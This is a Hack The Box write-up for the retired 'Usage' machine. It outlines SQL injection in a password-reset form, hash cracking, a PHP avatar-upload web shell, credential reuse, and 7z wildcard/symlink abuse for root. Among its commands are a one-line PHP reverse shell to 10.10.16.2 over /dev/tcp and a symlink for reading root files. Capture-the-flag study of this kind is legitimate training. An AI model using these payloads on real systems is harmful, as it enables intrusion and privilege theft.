---
title: HTB Usage
slug: usage
lang: en
platform: Hack The Box
category: Web Exploitation
headline: SQL injection, laravel-admin avatar upload RCE and wildcard archive abuse
difficulty: Retired
objective: Root / Administrator
date: 2024-11-08
tags: [Linux, SQL Injection, Laravel Admin, File Upload, Wildcard Abuse]
---

# HTB Usage

## Executive Summary

Usage contains a SQL injection in the forgot-password workflow. Database extraction reveals an administrator hash, which is cracked and used to access the admin panel.

## Initial Access

The laravel-admin avatar upload path can be abused by uploading PHP content with a double extension. Browsing to the stored file executes the payload and returns a shell.

## User Pivot

A `.monitrc` file exposes credentials for the `xander` user, allowing SSH access.

## Privilege Escalation

`xander` can run a custom backup helper with sudo. Reverse engineering shows that it invokes `7z` over `/var/www/html/*`, making it vulnerable to wildcard tricks that read root-owned files through crafted filenames and symlinks.

## Key Commands

```bash
hashcat <admin-hash> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```bash
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'"); ?>
```

```bash
sudo /usr/bin/usage_management
```

```bash
ln -s /root/root.txt @root.txt
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20241108194839.png|usage evidence 01]]

![[Pasted image 20241108194854.png|usage evidence 02]]

![[Pasted image 20241108221133.png|usage evidence 03]]

![[Pasted image 20241108221221.png|usage evidence 04]]

![[Pasted image 20241112200249.png|usage evidence 05]]

![[Pasted image 20241112200646.png|usage evidence 06]]

![[Pasted image 20241112200750.png|usage evidence 07]]

![[Pasted image 20241112200946.png|usage evidence 08]]

![[Pasted image 20241112201833.png|usage evidence 09]]

![[Pasted image 20241112202419.png|usage evidence 10]]

![[Pasted image 20241112201952.png|usage evidence 11]]

![[Pasted image 20241112202102.png|usage evidence 12]]

![[Pasted image 20241112203755.png|usage evidence 13]]

![[Pasted image 20241112203818.png|usage evidence 14]]

![[Pasted image 20241112204333.png|usage evidence 15]]

![[Pasted image 20241112204406.png|usage evidence 16]]

![[Pasted image 20241112204631.png|usage evidence 17]]

![[Pasted image 20241112204732.png|usage evidence 18]]

![[Pasted image 20241112204940.png|usage evidence 19]]

![[Pasted image 20241112205023.png|usage evidence 20]]

![[Pasted image 20241112205055.png|usage evidence 21]]

![[Pasted image 20241112205435.png|usage evidence 22]]

![[Pasted image 20241112205635.png|usage evidence 23]]

![[Pasted image 20241112212150.png|usage evidence 24]]

![[Pasted image 20241112212342.png|usage evidence 25]]

![[Pasted image 20241112212405.png|usage evidence 26]]

![[Pasted image 20241112212510.png|usage evidence 27]]

![[Pasted image 20241112212714.png|usage evidence 28]]

![[Pasted image 20241112212909.png|usage evidence 29]]

![[Pasted image 20241112213014.png|usage evidence 30]]

![[Pasted image 20241112213032.png|usage evidence 31]]

![[Pasted image 20241112213403.png|usage evidence 32]]

![[Pasted image 20241112213658.png|usage evidence 33]]

![[Pasted image 20241112213915.png|usage evidence 34]]

![[Pasted image 20241112213949.png|usage evidence 35]]

![[Pasted image 20241112215600.png|usage evidence 36]]

![[Pasted image 20241112215616.png|usage evidence 37]]
